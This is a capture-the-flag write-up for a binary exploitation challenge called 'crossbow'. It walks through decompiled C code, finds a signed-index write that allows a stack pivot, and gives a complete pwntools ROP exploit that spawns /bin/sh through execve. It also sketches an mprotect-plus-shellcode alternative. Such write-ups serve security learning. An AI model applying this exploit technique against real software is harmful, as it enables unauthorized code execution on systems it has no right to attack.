* Description

Sir Alaric's legendary shot can pierce through any enemy! Join his training and hone your aim to
match his unparalleled precision.

* Solution

Run the program with some random choice like this:
[[file:2025-04-18_16-30.png]]

Let's load it with disassembler to analysis. ~main~ function like this:
#+begin_src c -n 1
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx
  __int64 v4; // rcx
  int v5; // r8d
  int v6; // r9d

  setvbuf(&_stdin_FILE, 0, 2, 0);
  setvbuf(&_stdout_FILE, 0, 2, 0);
  alarm(4882);
  banner();
  training(4882, 0, v3, v4, v5, v6);
  return 0;
}
#+end_src

There is nothing interesting, dive into ~training~ function:
#+begin_src c
__int64 __fastcall training(__int64 n4882, __int64 a2, __int64 a3, __int64 a4, int a5, int a6)
{
  __int64 v6; // rdx
  __int64 v7; // rcx
  int v8; // r8d
  int v9; // r9d
  int v10; // r8d
  int v11; // r9d
  char v13[32]; // [rsp+0h] [rbp-20h] BYREF

  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: You only have 1 shot, don't miss!!\n",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    a5,
    a6);
  target_dummy((__int64)v13, (__int64)"\x1B[1;34m", v6, v7, v8, v9);
  return printf(
           (unsigned int)"%s\n[%sSir Alaric%s]: That was quite a shot!!\n\n",
           (unsigned int)"\x1B[1;34m",
           (unsigned int)"\x1B[1;33m",
           (unsigned int)"\x1B[1;34m",
           v10,
           v11);
}
#+end_src

There is only one function call ~target_dummy~, which pass a *stack variable* as parameter.
#+begin_src c
__int64 __fastcall target_dummy(__int64 a1, __int64 _x1B[1_34m, __int64 a3, __int64 a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  int v10; // r8d
  int v11; // r9d
  _QWORD *v12; // rbx
  int v13; // r8d
  int v14; // r9d
  __int64 s_unlocked; // rax
  int v16; // r8d
  int v17; // r9d
  int v18; // [rsp+1Ch] [rbp-14h] BYREF

  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: Select target to shoot: ",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    a5,
    a6);
  if ( (unsigned int)scanf((unsigned int)"%d%*c", (unsigned int)&v18, v6, v7, v8, v9) != 1 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v10,
      v11);
    exit(1312);
  }
  v12 = (_QWORD *)(8LL * v18 + a1);
  *v12 = calloc(1, 128);
  if ( !*v12 )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: We do not want cowards here!!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v13,
      v14);
    exit(6969);
  }
  printf(
    (unsigned int)"%s\n[%sSir Alaric%s]: Give me your best warcry!!\n\n> ",
    (unsigned int)"\x1B[1;34m",
    (unsigned int)"\x1B[1;33m",
    (unsigned int)"\x1B[1;34m",
    v13,
    v14);
  s_unlocked = fgets_unlocked(*(_QWORD *)(8LL * v18 + a1), 128, &_stdin_FILE);
  if ( !s_unlocked )
  {
    printf(
      (unsigned int)"%s\n[%sSir Alaric%s]: Is this the best you have?!\n\n",
      (unsigned int)"\x1B[1;31m",
      (unsigned int)"\x1B[1;33m",
      (unsigned int)"\x1B[1;31m",
      v16,
      v17);
    exit(69);
  }
  return s_unlocked;
}
#+end_src

Until now, the program's behavior is very clear:
1. setup some trivial banner information.
2. call ~target_dummy~ within a *stack variable parameter*.
3. call ~scanf~ with *%d* as format string to get a index, notice that format string accept a /signed int/.
4. *use the user input idx to index that stack variable*, and allocate memory at that position for
   user content.
5. print that user content then program normal exit.
   
Now, the keypoint is the number four, which we can control where the allocated memory address
position. In fact, we already can infer the relationship between the user idx and stack variable
from ~target_dummy~ call. But we also use =GDB= to identity that.
[[file:2025-04-19_13-10.png]]

So here we can =pivot stack= to execute =ROP= gadgets by give the -2 idx, cause *NX* enabled. 

#+begin_src python :results output
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

io = process('./dist/crossbow')

padding = b"A"*8
pop_rax_addr = p64(0x00404bc7)
bin_sh = b"/bin/sh\x00"
pop_rdi_addr = p64(0x0040ac2d)
# any position that writable is OK
writable_addr = p64(0x0040d000)
mov_rax_to_rdi_ptr_addr = p64(0x004020f5)
pop_rsi_addr = p64(0x004069b6)
pop_rdx_addr = p64(0x00401139)
execve_syscall_num = p64(59)
syscall_gadget_addr = p64(0x00405346)

payload = b"".join([
    # Padding will be set into RBP when leaving training. Actual value unimportant.
    padding,

    # execve pathname argument: gadget chain to ensure rdi points to "/bin/sh"
    pop_rax_addr,
    bin_sh,
    pop_rdi_addr,
    writable_addr,
    mov_rax_to_rdi_ptr_addr,

    # execve argv argument: null pointer
    pop_rsi_addr,
    p64(0),

    # execve envp argument: null pointer
    pop_rdx_addr,
    p64(0),

    # Ensure rax is set to the execve syscall number.
    pop_rax_addr,
    execve_syscall_num,

    # Invoke the execve system call
    syscall_gadget_addr
])

_ = io.sendlineafter(b'shoot: ', b'-2')
_ = io.sendlineafter(b'> ', payload)

io.interactive()
#+end_src

[[file:2025-04-19_13-17.png]]

BTW, there is another way to achieve the goal:
1. use ROP to call ~mprotect~ to get a *RWX* place.
2. use ROP to call ~read*~ to get the actually shellcode.
3. ~ret~ to the shellcode.
   
~read*~ means all syscall that can get input from user to where we want. 
